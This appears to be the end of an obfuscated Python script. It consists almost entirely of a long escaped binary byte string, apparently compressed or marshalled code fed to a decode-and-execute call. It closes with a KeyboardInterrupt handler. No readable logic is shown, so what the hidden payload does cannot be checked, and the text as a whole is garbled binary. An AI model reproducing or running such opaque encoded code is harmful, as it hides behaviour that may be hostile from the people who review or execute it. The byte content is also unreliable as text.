\xba|(B\xe9O \xfb\xa7z\x95\x80\xe8\x1c\xba\xe9s\x84\xb3\xd9\xea\xfah\xa8S4\xc8Dy}\x18\x81X\x8a\x0e^\x9f\x1elM\x0e_\xa6qu\xe5\xa7\xea!\xc2f@n\x81`\xb4e\xe9uF\xa0\xf3\x138\xf1a\xaa\xadt\xed\x0e6\xcd\xca\xf7\x03\xa2\xcd\xad\tQ\xcb\x1f\xaa0\x07(\xed\xe3Mk\x12r\xaa\x02=h\xf4\xa3\xb4\x94?\x07}\xe6Q\xc7\x8a\xe5FP\xdb\x7f"2\xfd\x9eYA\x03\xde\x02\xa4>\xbb&\xce\xb5\xa3\xab\xefsm\x9c\x98q\x07\x9b\x05*q\xba>\x1b:7\x17_\xde\xee3\n\xab\x83=\xa6\xfd\xa8}\xeb\xe54\xfbf\xd1![=\xc3\xf4\xae}\xa9\x94\xa0,`)\xe4Pc\xdf\x99\xd6n\xa09\ry\xf6\x0f\xaa\x1c\xbeF\xec\x01ZJ\xc3M\x88\xbbB\x87\x8e\x04oJ\x89\xab\x97\x9d\x93\xbc\x0e&X\x9f\x18.\x0b6V\xe5\x84}^5o\x87%\xd9\xedC\xc7#\xc0\x9d\xe2\x7f\x95[\xdc\xc9H\x88\xff\xa4\x83\xbdqh\x0f\x06l\x17\x06\xab\x80\xfduR\xd0M\x83.u\xfc%\x92\'\xe6Y\xf0>&Vb\xfb1\x7f-\xd6\xcb\x93\x92,\xcait%\x1e{\x96\x11E\xa9\x8b\xfe\x99\x05\xba\x01\x91Y\xe3\x14\xd9u<\xc7Y\xc4\xde\xf01\xfa\xb8\xaa\xfe\xcez\xba\x0c\x1d\x99\xcd+q\x86\xb8r\x9dK\x9fC. \xd45\x9a&i\x1eX*\xfe\xd8\xdcu\x85\xa8\xd2\xa8\x83\x9e\x005uh\x9bX\xf7\xac\xe5\x11\xe4cJ\xac\xe2\xfe\x9a\x97L\xffg\xfb\xd1\xde\x1f1\x94\xa2\x86q\xb8[\xc4ZS$\x02\x07\x04T\xech\xee\x93Gu\xc9\x8ff\x82fk\x83\x1f\x11\xabf\xd97\xbc\xab\xf1:&\xd5\x9eg@\xe0\x9f\xc8\xd7~\x16P\xd2S\xd3<[\x86\xda\xcb/;\x0e\xa1\xfc\x18\xb19\xd9|\xf3\xca\x9aIn$\xe9!\x91\xa5\x9daW+\xeb\x18\'\x01J"\x9cN\xd6\x05\x9a\xcc\x06\xd7*\xb1G%\x1b\xa1*\xd4e\xa0\x92H4\x16\xd0\xcb\x95\xc5\x88\xd40\x88\xd7{\x13\xc9\xdb!\xefA\xf5\x86\'\xcb\xcc_\xfe\x83y\x8b7\xd7t\xb4\xe3\xe4\x85\xf1\x14&up\xcd1\xf5\xed\xe6\xdf4\xfd\xad\xcf<\x8b\x13[\xcb\x7f\x01\xb81\x9d\xec\xc8\xab\xe0\xb3J\x9dVU\x00\x19\xd3\xa7\xdc\xc38\x1b\xd1[h\xcf\xcd\xc0\xaeQ\x05\x82\x84$\x85\xb9B\xa1F\xad\x89\xe4\xdb\x80\x1d\xd7>\xa4\xec\r:\xbe9\x13\xc7\xa5\x8d`\xdfO]\xd7\xd2\xd64\xbc[\xf1K6"\xb8\xb5\tW/\x1e\x1fvk\x9f$\xfe]?{g\x17\xc6\xc3uR\xcbx\xcb\x94\x93\xf9\xec\x8a\x9e\xe1l\xde\xae\xa5M\x06s\x04\xa32I\xc7\xab\xffpGPC\xba\x83:BQS\xb3\xab\xe5\x0ed\xa7\xb1/\xed\x07\xaa\xfd\xce\xcd\x1fu\xb8r\xf2Lzla\xc7\xc8O\x90D.\xddhb=\xdfQ\xd8\x1ec\xddk\xebjS\x83W\x1a$s\x00\xb7E\xc2\x06\x18\x9b\x867\xbb\xdc\xc5\x86\xd9n\x98\x8bK?\xb1\xf3B1\xdb\x14Y*\xbc\x01m(\xed\x9df\xbf\xa2w(!E\xbd\xfc\xe0\xbb\xf0\x9e\x1f\x04.\xd7\xcf\xa4K\xea\xe4t\xfa5bL\xc4\xc8*W\xb3\xf6#\x8f\xb7\n9\xf0\xa2\xaa\xc3>\xec\xdf\xaa\x9e\xe9\x08\x92`M\x80\xfdowm\xf4\x8b\xc2i\x98\xda\x8dm>o\x9a\'\xc6A\x7f$H\xd38y\x18@\xb9T\xc7sz0\x14\x07B_S\xf7p\x1c\xc1\xcb\xdf\xa6\xaaqZ\x11\xaff\xb6\x14\xc5k\x7fv\xd8\x997M\x04V2\xff\x1e|@9B\x85\xce\x97|\x92\x91\xa7@ii\xa9\xe8\xdb\x10\xc2\xec\xf5\xbe_y?,\xe7\xe9\x90\xef&\xba\xb8\x9c\xe0\xa5\xd3\x85\x85\xe7o\x1a`\xf1\xaa;P\xb1\xe9\xe2\x9a\x82\xe1\xba\x97\x93i\x85}l\x01\xb4\x85\xb2\xd3\x98\x9a \x88*Z\xe8\x9d\x93\x1ds]\xe3\xa1\xcd\x01\xe37\x12\xb6*\xf3%\xf6\xf3e(\x9a\x8c\xbb\xdf\x18\xe6\x1b\xe8\xd5\xfa\x1e\x06\x96Yn\xbc\xe0\x96\x0crEj@\xc84\xe0\xbb\xd9\xa7\xb9\xc5\x81\xb5*J\x11\xe83\xe5\x1a\xcaJ\x8c$J\xfbz\xa3\xa9\xf9\xae\xfb\xc2\xefn\x03A\xd9\xb6\xf4\xe6db\x1d\x1e\xd0\xb0\xfa\x93\t]b]i\x9f\xc8\xfc\x08\xfa\x9c\xb4\xbaN\x03w\xd7\xd9\x07\xbb/O\x16\x94\x18\x072vs\x8ch\xa2\xb2\x7f\x124m8\x82Y\xddP\x8a+s\xd1N\xa0|=\xf4o\xd1M3\x80I\x03BR\x9d\xd6\x83Wc`{\xcc\x87\x8b\xa6\xd5N\xf6\xcb\xb9{8\xed\x07s\xec<\x1f\xc1g.\xa2B\xb1\xae\x98\xd6_\xc6\x10\x16@\xa1\x9a\xedg_D\xfa\xae\x08Kf\xec\\\x1dXH\x1dZ\x08\xf7k\x9d\x0c\xa0\xd36\x1b\xaf\x91\xf9\xef\x8a\x94R\x05\x8e\xfa\xf5K^\x85\x80\xd2\xb2b\xf6@n\x87\xa7>-\xdeH\x7f\xb3g<*:\xf3\xe3\x96\xa8M\xab\xeb\x88oF\xfb(Z\xb2x\xd40b\x07\x93\x8f\xe3\xf82=\xb0Z\x94\xa9\x14\x08\xa8\xfb8\x07aH\xfe.w\xd0\xb4l\xba\xd1o9\x98\'\x8a\xd0\xfb\xb7\xb4\x8dI\xc0\xb0\xe4\xb8\xa0i\x14\xc5\xf1\xb2\x17\xd7\xb2F9\xf52)\x07\x9db\xe8\x84&\xedK\xf6\xa4\x9a$\xd6V\'kT\xb9\x9a\xbe!\xc3\xdc=`\xddw5\xe7\xda\xced2\x90\x14\xc3\x0cuxH\xc7@\xbd\x9d\xfcV\n\xfd\xf2\xbb\xa6\xa5\xeb\xb9=\xf3hJ\x94\x06?\xa8p\x8f\x8fs\'m\xad\xd7\xed\x0bpf\x99{l\x01\xf6\xdbRlM\xf4JT\xfc7\xc6\r\xcf6<\t\xddF\x98G\x047uC\x8c\x84\xd9\x15\x97N#\x1b\x84\xd6\xc1oa>\xfd\xde\x15\x0e<q\xa4\xe5\xb4U\xae\x9dY\xc6E_\x8f\xd7\xdd\x1e\x8a\x8d*\xc7\x95\xfb\x81^\xec\\k4\xf7pNMN\x99\x8e\x10\xb9F\xae\xf1\xe7\x1c\x04Q\x04\xf3\x0e7\xa7\xf4\xb9\xf7\xb7b\xf9\xf1\x9c\xaa\xed\x1a\x90\x92N\x02\xb0\x19yd\xb1\xa4\x92\xf9\'\x9d\xef0\xba\xb0S\x07~+\xc3\xb4\x93\xe2\x9f\xc2\xf6\xc1Ms\xa0B\xef^\x1f\xf4\xf3\x13\x0b\xc2$M\xc1\x93t\xe6\xb7\x85\xdd\x17\x82\xc2\x06\xff1x\xef\xb6\xae|\xa5\x1b\xddVwE\xce\xec\x1d\xeb\xe4*\xa7\r\xac\xbf\xa5\x96\\\xa3\x8b\x87\x8a-\x8e\xa5l;\xb90\x94eyQ\x93\xb4\x83\xa2\x07\x97ja@\xcfe\x84\x1e\xaaFN\xd5e.\xd1\xe5\xb8\xb4\x94\x17!#\x0e\x10\xca\xa3\xcb\x93\x80\x90\xd9\xf6\x89\xc8\xae\x82y\n\xd9\x8di7\xa0s^l\x07\x859\xa2\x90\xe9O\xd8{\xcf\xa6\xcffM\xb0\x15X\xb9fy\xf0\xdbw\x15\x1e\xbd"ab\xb6\x95&Ol\xc4\x19\xb0h\xdc\xe9\xf8\x9aD\\zc\xd1\x8dYt\n\xce\xa6,)\xad \xe3\x98\x9dG\xccb\xe31\xab\xf7m\xef\xbcW%zn\x9cz\xc7\x9d\xb8\x05P\x98\xac\x02j-e\x81\xee\xc3\x8c\xb9\xf5\x012i\x7f\xd1\x03\xea\xf4\x7f\xd59RjI\xa5\x10\x04#\xc9{\xa9\xa8I\x82\x93<\x0b\xf2k\xe3\xb2w\x8d\xe2d\xc8\'\x87(\xe7\xe4\x05\x04\x1a~\x8a\x14A\xf6\xa5\x04\xca\xd7G\xacU}G\xe5_\xf9\xec/\xdf\xda\xcd\x1fe.\xa2V%\x08\xd9\xe6R\x8a\x1d\xb0>F%wN0&-ew\xb4\x80\xe70\x98\x81\xfa\xfbid\xd5"\x04\xb2\x0f\x96\x1b\xf4\x8f=<\xf8\xf5{\x9c\xb2A{\xa0\n\x95\xef\x11uC\x89\xe732\xa4\xf6\x88)\x89\xc4l_J)G,\xc4\x8e\xd4\x1e]O{f\xba=\x96Dp\xea2\xdb(\xf7\x15f-\xf3\x90?\x9c\xc7I*\xa0\x8b\xa1Y\xa7C"\xa0\x9c\xa4\xf5\xb7a\tY\xbe\rb\x8b\xb1\xbd)\xaaA\xd7\x06q\xc73\xa7\x13<\xe7\xfa\r\x8f\xd3;\xdd\x0be\x13\xcc\xa9cx\xbc\xbdF\xec\x86\xf1\x8c\x14\xae\xf3\xb3J\xfa\x9a\xed\x10\xe7)=)\xb7[=\xa9g#\x99X+!n\x1ee\x07\xd2\xa9\xd1"\xe8\xa5\xc1\x93\x1b\x8c2>\x00\x8e\x1a\xc6\xc9\xf5\xa8\x97T\xbb=;S\xa5\xd9\xbakA\xc5\x7f\x1e\xda\xc6sa4\xc0\x06\x7f,\x8cr\xf3\xd1l\x06\xa2\x82Qx\xe0Gt{z\xd6\xb9E\xe4]\xc1Wy\xf4\xa2\xa7\xa0Wa\xc2\xd63P|)\xf3\x88\xfc\x87\xeb8\xd1\xc2-\xc3\xeb\xaa\xceN\x0c\xa0\xfa\xafa1\xa4Y\xf1\xddT\xd1i\xde\x15\xd9\xfb!\xe9\xb59\x15\xc9O\xc1\xed\xb0\\\x1b?\xb33\xe1\xc32Q\x15)\xb2\xec\xdbB\x88X\x13s+\x0fx\x172hI\xbe\xa2\xe20\xb4\xb6\xe7\xe3\xea%{\x95E\xde\xb2\x1c\xfed\xe2\xfc}R\xb3\x95\x1a\x13=P\xf0\x90\xf4\xcd]\xbd}\xe1\x0b\xaa\xcf\x94M\xf9\xb5\x92~YL\x94G\x1974\xd62\xdeX\x87\xb2\x84\x9f\xc5\\\x9b\x95\x81{\x8cm[a\xedA\xd0\x18\x92\x85L\x92i\x9fZ\x99\x13z\xdc\x8f\x8eXNsm\xf1\x97\x92\xf33\x17\xd3\xb9M\xcf\xb2V\x1bR\xe3\xf2\xec1t%:\xec\x96\xae0i)\xd8\x19\xe2\xb1\xf4DZ\xb7\xa12\xa9\xcf\xbcnm>O\xbe\x0e#&\x15\xd8\xa0S\xf3\x85mW\xb7\xe2&(X\xdb\x99\xda\xc8\xf6\x15\x1f\xa32\xe0T\xd8\x8c\xed\x06\x8c;\xb1\xf8\\\x07<^o\xd0\xd1\x90fGk\x137\x83G\xdd`_1k\xbc\n\x06\xc3k\xcd\x00\xac\xcej\xf3\xe2\xb4`)\x81M\x8c\xa52lW\xee"\x17\'\x1b\x00\xa6\xb9X\rv$ll\xebj\x96\x86m\xe6|ext6\xadO\xa3\x05\x1e3`7\x7f\x7f\xb1\xcb\xf3?\x17\xe3&\xcb\xb3Q\x0b ^}\xb28\x99\xba-^\x1e\xbe\x97\xe2\xba_9\x7f\xc09\xe2\xa8\xb4\xc0\xb7\x1d\xc6\xe0\x80g\xb4-\xd6T\xf5\xe56\x17\xee\x8b\xf7\x1a@}\x8e\xe3\xb4\xd7_\x06\xc1\x18b!CN\xa4\xb1\x7f\xf3q\x81{bq$\x9b\xc8PK\xc0\xe5\xa5\x1f\x9cyM\xd2eg\xc8\x1a\x18\xe2\x9d\x92o\x1cYh^\x8d\x12\x90\x02\xa4\xe9{|\x15o\x19j\xc7\xe9\xcc)\x8d\xb7M\xe2\xdd\xcafz\xe4z\xaf\x13\x0f\x02P\xb82\x81\xbb\x9b\xc4W1\xed?\x84W\xb1l\x8d\xfcA+\xef\xd6\xab\xde\x83\xf7\xdc\xff\xeb\x84r\xe5\x07\x9f\xfb#,2\xdea{R\xfb\xb3\x1f\xf6\x0f\xa4\xa8W\xbb\xb9?s\xac\x9b~\x82\x9a\t\x8d\xba#\xdc\x9b7gy\xf5\\J:\xc3\xc3W\xc0\xeb\xd1z:\x9a\x9e\xd6\x83\x9c\xdeSf\xc5\xd7\x9dN1\x15h`N\x97\x92Q\xdb\x01\xb7,\xbb/\xbbWz\x94\xdfu\x03\x83<\xf6\xe9\xac\xdf\x07\x7fa(w\xcf\xb1X\xa1\x88\x1cE\xe4p\xe4\x05X\xb1\xb2\x03P\xdc\x08Tc\x8a\xe6\xe3\xba\xe6\xe2\xb5\xd4\x9d\x88Hy\x16N\x078=\xd6\xf7\x0cui\t\x18\r\xc6`C~\xcf\xe1\xa0\xa7\xc2#{3(69\xc4\xa42\xf6\x8f\x1cK-\x91\x8f\xb8\xf3\x9b\xb3\xc0/n%\xf3\r\xfe\xad\xf5AB\xbdI\xa9m(JD\x05B\xe7\xc1H\x9a\x0fd>g\xb7\xaeZ-\x97\x9d\x96\xcf^\x92M\xb5\'\x85\xda\x1a\x90bk\xf6&\x08@o2o\xfa\x85\x9c\xd2v\xb7\xb4.\xd9N\xe3{\x1e\xd8\x0fdF`\x9f\xf9H\x07\x97\x80\xd6\xa1\x19M\xa2\xcf\x873}+\xc4n\x86\xf4\xe3\x08\xfb\xd8Z\xc2\x1b\x12\xe3\x05p\x87rm]3\xba?&T\x1e\x10\xd2\x81T\x9f\x14:\xdf-3\xf5\xeb\xb3\x07I\xc0\xba\xec\x87\xdd\xdf\x0c\xdb\x04\xf1\xa5\xe46S\xf3?\x8e\xef\xd8l_)\xbetY\xdb$\xf0tV\xbbX\xb9\x1a\x95\xa4\xa6\x8d\x16c\x93:n\x19\xf0VK\xe8\x85\xc8\xe74s\xe8w\x95-\xd6\xb0\xcf\xd2\xf3.\x0c\xd2) \xe7=\x8a\xc4O_B\xb7%o\xc9~\xfb\xc2\xb62\xf6|\xcf\xfb\xdd\x1a\x99\n%N\xaa/k\xf6\xb1;i\xdd\xb9\xbf\xbb\xfbm\xc5\x06SP\x8d\xc9>9\x87=7\x1b\xa4\xcah^\x95\xf2V\xa4\xd4m\xe2\xecKm\x84\x0b\xcd\xe1I>\xae\xde"l\x9c\xc7\x18\xbc\x89*q\xb4L8\x11P\xea:\xc7\xeef\xfa\x1d\x88l\xc3\x94\xd1\xaf\xb3\xe2LL6\xa6\x19\xcaE\x00y_\xf1\xd8\x0b\xe2\xf3\xecPO\x0c\xdaz\x97\xb2\x920\xcb\xac\xc5K@\xcf\x8b\x9c\xa6eF\xe2\xd4Hr\xd8\x86\xd12c\xa4\xb5e\'\x84=\x01{p\xd7\xcdld\xea\xda\xcaJ\xed\xe9\xe3\xfe\xfb\t\x8b\x88[V\xf0\x12\x94\xf7\xaa|L(\xff\xf5{Pk\xc6\xd6*\xbeh\x81\\NH1\x85\xa4\x01Uik\xfe\xec\x12W\xc3\x18\xf9\xa3\xea&\xa0/\xf8\x16\xf0u1\xd1\xb3\xaf\xb7\xcbc>\x94\xe4\x19\xf5:\xba\xd8\rk\xf1^B\xd5\x9b\xc1\xeffY\\rO\xa5\x19I\xddb\xb0\x00\x915x\xf3\xa8\x85\xc5\xb1\xfc\xc6#\x99\xed\xc2\xce\x81<\x14\xf5\x98\xe8\xe0\xe3\x9a\x938\xdd\x0b7\xadt\x1b\xf6\x04\x01\xe8\x16)1\xf2\xe0\xdf1``]\xb7\x866\x0b\xfca\x10\xa3\x1b7;+R\xfdr\xd3v\xd5\xad\xe7\xd5K\xf8\xbdC\xe7\x9e\x88\x03,\n@\t\x80H\x03\x01\xd1\x0e@Y\x81@\xc0y\x87)\xbf\xb2\x8b\x896C\xcb^\xc9\x0c% \xe8\xb2\xec+\x11Z\x8b\x98\x16\x9a\xbf\t\xa4O\xd78\x0e\xcc\x88\xd0\xdc\x1c\x8e\xda\xba\x9b\x1c\xfd-\xf6\x1c\xd7\xd8\x97\x82#\xe1&\xb3\xc3\xf3\xe5\xef\xe9kY\xbfYL\xae\xb1\xab\xe6\x15*\x0b\xe7f\xef\xfc\x90K\xcd*\xb9\x85V\x8b\xd9)\x83?\xccVk\xfe\xc7\xf8+s\xca\x19\x1c\xdf\xa5f\xbf\xc4\xc3x\xf1\x9fp\x9c\x96\x03\xfa\xdf\xf0I\xeb/\xecd\x8fP\x16\xec\x1e\xa0\xa3\x05\xc1[\x0c\xe6\xf9a\x8dv\x99\xb5\xdb\x1f8\\\xb7e\x9a\r\xcd\xd62\x1a\xbc/\xa4\xda\x0c\xa5\xfcY\x9d\xddaq\xb37\xfa\x7f\x16\x10\x9cD\\R\x8f\xa6\xa7\xea\xce;\xec\xa1J\x91\xb5\xb4\x99\xdd\x19h{4\xd0\xf7{\xec\xdcSP\xa9\xf1\xda\xbf\x0e \xf7\x96\xec\xfe\xc8\xa3yw\xe0\x8a\xce\x82m&\x9b)\xef*\x16\xf5x\xec\xab\x8e\xfa\t\x9b\x04|\x04)C\xdf\xbd|\xa8i\xcc\xff9\x1b\x87\xcf\x81\xcc(z\x9d~\x98\xb9\xe3\x98t8\x9e\x85\xd6\xd0\xaa\x1fwy\xd9\xb8V\xb9v\'\xd2\x81A)N2\x13\xd5p\xb1\x8a\xeb\x1b\x06\xd8\x11w~\xc6\x83\xafu\xa3\xd5dF\xa4V\x1f*\x81e\x1b\xb3\xc0H.\x02\x8a\x9d\xf0U?\x0c\xed\x01z\xf9n2\xb4\xa3><J,\'\x0f\xbe\xd2*%\n\x9cp]d\\\xf0\x9e\xa0\xb7\xd3%h?\xae\xea\xbc\x8c\x85\\z\x04p\xb6\xef>:j\xd0zv+\xcc1\xe6\x1d\x07\x84\xd3:\xd7\xad\xf2\xf8\xe1\xebF\ru\x00\xa8"\xb8\xa6\xedB\xccr\x96\xc5\xfcg\xaai\xc5\xb0\xcem\x05k\xbb\xb3\x8a\xb2\x95\x86\xae>\x8c\xf3\xa0IB\x9fQ\xec^3@\x90U\xaa(\xf2\xcf\x021\x91\x9cd\xd5\xcbA<\xb5\no\xd8x\xae\xd4\xc3\x84\xff \x0c\x8b\xc0G\xcb\xa0\xa6\xa9\x9fmb\xc4JI\xaf\x0e\xd4\x13\x91\xef\xfa:\x8e\xee\xd4\x17\x9d\xca\x89jg \xc4\x9e\x84\xc5O>{v\xff\x82\xf5\xdd\xe2\x9eO\x83\x0f"\x8b\xa6\xd51\xe2\xd5\x97\xedQ\xdd\xe1\xe8:o\x06\xeeh\xe0R\xa4dm\xc5F\xae=\x10\xb8\xe7\x9a\xd8:\x12h\xfb\xa5\x12$\xeb\xc9\xaf.\nQ\xe2\xe3q\xafeV\x1du\x1d,\xe6\x1f\x00\x0fa\xdf\xb6LR\xe04\xa9\xb9\x18@\xc5\r\xc0F`3\x86s\x07\xd5\xc9\xd0\x86\xab/\xe0\xbd\x05!d\x91t\xa9{\xc1\x89\x1b\x1d\xe4\x84\x8d\xc8C\x01\xafr3\xe7\x14_\x042\xb1\xf5\xd55\xfed\xec\xa1p\x13\xe63\xa4\xe1,#tg\xfe\xe5\xa2\xb0\xccV\x0cK\xdf\xe7\x125$\xa5\xeb\xb6d\x81\x06\x12\x1f]n\x90\x7f\x1e.\xf74xs\x9eHA\x10\xf4\xa8\x08\x9dg\xcd^\xdc\x98\xe1\x0b\xfc\xf6\x13\xb21\xa8B\xc4S\xcf;\xb7\x11Jh\x1e\xfc\x06\x91^\xe1\xac\x15\x0c\xec\xb4*\xf9\x00\xed\xe5\x08\x88\xa2\x82\xbax\xa2P\xe7\xc5\xe2k\xad\xac\x87\xc3\xe6\x89\xea\xa1\xfdO\x015shv\x9d\xf9\xc0C\x0b\xa5\xd2&\xaeZ\xe1\xe8\xc3\x15\xdf}$\xf5\xc4\xb4\x9b\x08\x1b&\x88^\xba\x9f>\x1b\xb6\xbe\xb8_]n\xec\xbf\xce\xf20P\xc47\xce\xb8e\xb2\xe0\x10\xcb\xfc\xc9\xc2\xef\xbd\x85O*\x06\x86Q\xa8^\xaf\x9fY\x83\xdd\xb3\xc2\xf6\xd0\x9dp\x8fM\xc8\x99y\xea<\xd5\xab\x90k[\xbf\x8b\xa7\xb9\xdc\xb6>\x7f\xa2I\xc9\x02\xa9\xdf\xba\x92\xa8\xec\xf1<T\xbf\x92*\xe4V\xaf\xf0\xd7\xb9\x8e\x8dX\xe4~\xceA\x9d%\xb2\xd6\xfaL-\x02\x0b\xe6{a\x9d\x1f\x14\xe5P\x0f\xce\x15\xa5s\xf1b\xc8\xa1"\xf7G\xd2Z\xe6P\xddHq\x8a\x0e=&\xbc\xc7\x1b\xab%oq\x11\x87\xe6\xb4U\x04fH\xdcc!\x01;J)uT\x08\x04\xb6p\xd8hX\x10\xaf\xa5B\xcc\xbc\xe0a\xf7\xac\xc2\xa9mV\xdd\x92$4i\xc5\x05\x81\x9c\xcc\xadH&\x8b\x90\xc27e\x9b\xe6\x07}\xf6\xa1EZ\r{\x03Q@"\xb9\xd2\xcb\x9d\x15\x86\xab\xda.\x80-N\x0039\xc7\xc9V\x04<C[\tW\xaa\xef\xb1Co\xc8\xf2\xc8\x01\xdc\xe5q\xd6-Gh\xc0\x964\xe8f\xd2\x9f\x93(\xf1\x0c\xc5\xd7\'\x92Yg\xbcz\\f\x92\xe3c\x9f\xa1K\xc8\x98\x8e<\xff\xce\x8a\xbf\xfe\xa8\x89\'\\\xaa_\xc8\xb6\xf1\x83\x16)Q\xea\xcb\xfay\xbe\xd5\xe39\xd6\xdd\xa3+]\xd1\xa2\x91\x0b(\xa4\x1b\xfa\xeam_\x9f\xd4G\xd4\xf9>\xb7\x95=\x87\xcd!|RB\x02\xcbq\x1e\x81\xdd\x19wq\xac\x19\xd9\xfc\xc1\xd49 \xd7\x8f\x9f\xc1\xa8S1\x8b\xcc\xfb\xe0\x1c\x8d\xf7\xe0\xe1I\xd8\x94\xef\xc8\xbb\xcb\xd3\xe7\x19\x892\x9bR\x92\x89~\x02\xcb\x89\xc0fG\xd6\xd5\xe3\x03\x83\x03\xaf\x96YJ\xc2\xfb\xddP\xc1\x05M\x9ep\xf2\xe4\xf0\xb0\xc99\xde\x80$f.\xe5\x0c:(\x7f\x11p*\x8e\xdb\xd3\xa2\xce\x98l\xa2\xad\xe3I\xfd\xde\xc1gF\x13\x8e\xb5\xe7\xe8\xa2\xe1\xf9\x83\xf8\xb9\xe4\xdb\x8c\x8e\xca\xb1\xa9\xd8\x8eH\x0b.?\x04$\xdf\x13\x81\x00\x18\xd8\xa8\xd6\x10vu\x14\x06\xb3\xb2\x0b\x18v\xe4>\xbc\x05CD\x83r\xe2As\xa0\x0e\xbd\xbcA"\xea\x1c\xc02\xd0P0o\xac\xbe\t\n\xbc\x9aG">\x1c}JI\xc8<%?$d\x03L\xf1\x96\xdd\x16\xdc\xdc4\x19=A\xdf&\xccV\xb8\x19\x04DqI\xc4\xacy\xda\xf9\x1f\xaf\xae\xcbrxB\xbc\xb3\x18\x1fDt\xb5\x1f$"\xee\xd1\x15>\xe3\x86\xb2\x87"\xdf\x9b\x0b\x86\xabb\x03\xd2+R\xb1G\x0e\xff\xf1w$S\x85\t\x03/\x8ag@')))
except KeyboardInterrupt:
	exit()
